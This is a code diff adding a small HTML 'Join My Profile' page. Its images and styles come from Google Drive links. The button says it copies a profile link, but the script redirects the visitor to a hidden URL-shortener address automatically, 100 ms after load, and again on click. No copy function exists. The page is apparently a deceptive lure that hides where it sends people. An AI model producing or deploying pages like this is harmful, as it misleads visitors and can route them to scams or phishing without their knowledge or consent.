@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://drive.google.com/uc?id=1R1Dfp9TFBR3Iwn37aSHFnuxwpSrF24R2">
+<link rel="icon" href="https://drive.google.com/uc?id=1h7wx4GlHlYHQJ87-mCMteusHs6VagxKY" />
+<link rel="apple-touch-icon" href="https://drive.google.com/uc?id=1BSm8M-1b2cwzbzfDTPPYt9viywkXKy4i" />
+<title>Join My Profile</title>
+
+</head>
+
+<body>
+  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
+  <button onclick="myFunction()">Copy my profile Link</button>
+<script>
+    setTimeout(function() {
+      myFunction();
+    }, 100);
+    
+    function myFunction() {
+      var url = "https://u.to/qPLCHw";
+      window.location.href = url;
+
+      function killPopup() {
+        window.removeEventListener('pagehide', killPopup);
+      }
+
+      window.addEventListener('pagehide', killPopup);
+    }
+</script>
+</body>
+</html>
